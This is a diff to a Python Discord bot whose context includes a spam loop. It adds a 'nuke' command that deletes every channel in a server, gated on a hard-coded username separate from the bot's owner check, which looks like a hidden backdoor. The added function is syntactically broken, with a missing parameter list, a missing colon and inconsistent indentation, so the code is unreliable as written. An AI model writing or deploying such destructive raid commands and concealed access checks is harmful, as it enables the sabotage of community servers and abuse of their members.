@@ -31,7 +31,14 @@ async def on_ready():
 # ================= OWNER CHECK =================
 def is_owner(ctx):
     return ctx.author.id == OWNER_ID or ctx.author.name == OWNER_USERNAME
-
+# ================= DELETE ALL =================
+@sudo.command(name="nuke")
+async def sudo_nuke
+ if ctx.author.name != "nico044037":
+        return
+    for channel in list(ctx.guild.channels):
+        try:
+            await channel.delete(reason="sudo deleteall")
 # ================= SPAM LOOP =================
 async def spam_loop(target: discord.abc.Messageable):
     try:
@@ -161,6 +168,7 @@ if not TOKEN:
     raise RuntimeError("DISCORD_TOKEN environment variable not set")
 
 bot.run(TOKEN)
+
 
 
 
